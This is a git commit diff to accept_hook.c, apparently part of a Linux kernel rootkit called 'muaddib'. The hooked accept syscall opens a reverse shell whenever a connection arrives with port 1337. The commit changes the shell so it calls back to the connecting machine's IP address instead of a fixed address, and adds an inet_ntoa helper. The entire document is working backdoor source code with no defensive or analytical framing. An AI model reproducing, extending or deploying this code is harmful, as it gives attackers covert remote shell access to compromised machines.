9cb364d2da7e09fb94078a1321b2509359fe2737
Nerelod <dapperfellowdaniel@gmail.com>
2022-02-16 14:22:01 -0500

    accept hook uses dynamic IP

--- accept_hook.c
+++ accept_hook.c
@@ -1,11 +1,20 @@
 //#include "accept_hook.h"
 
+
 #ifdef PTREGS_SYSCALL_STUBS
 
 #define SRCPORT 1337
 
 static asmlinkage long (*og_accept)(const struct pt_regs *);
 
+static char buffer[18];
+
+char *inet_ntoa (struct in_addr in) {
+    unsigned char *bytes = (unsigned char *) &in;
+    printk(KERN_INFO "%x %x %x %x\n", bytes[0], bytes[1], bytes[2], bytes[3]);
+    snprintf (buffer, sizeof(buffer), "%d.%d.%d.%d", bytes[0], bytes[1], bytes[2], bytes[3]);
+    return buffer;
+}
 
 asmlinkage int muaddib_accept(const struct pt_regs *regs){
 
@@ -13,18 +22,15 @@ asmlinkage int muaddib_accept(const struct pt_regs *regs){
     struct sockaddr_in *sock_in_kernel = NULL;
     int ret = og_accept(regs);
     sock_in_kernel = kzalloc(ret, GFP_KERNEL);
-    long error = copy_from_user(sock_in_kernel, sock_in, ret);
-
+    long error = copy_from_user(sock_in_kernel, sock_in, sizeof(struct sockaddr_in));
     if(error){
         kfree(sock_in_kernel);
         return ret;
     }
-
     if (ntohs(sock_in_kernel->sin_port) == SRCPORT) {
-        start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
+        char *ip = inet_ntoa(sock_in_kernel->sin_addr);
+        start_reverse_shell(ip, REVERSE_SHELL_PORT);
     }
-
-    printk("accept hooked :)");
     return ret;
 
 }
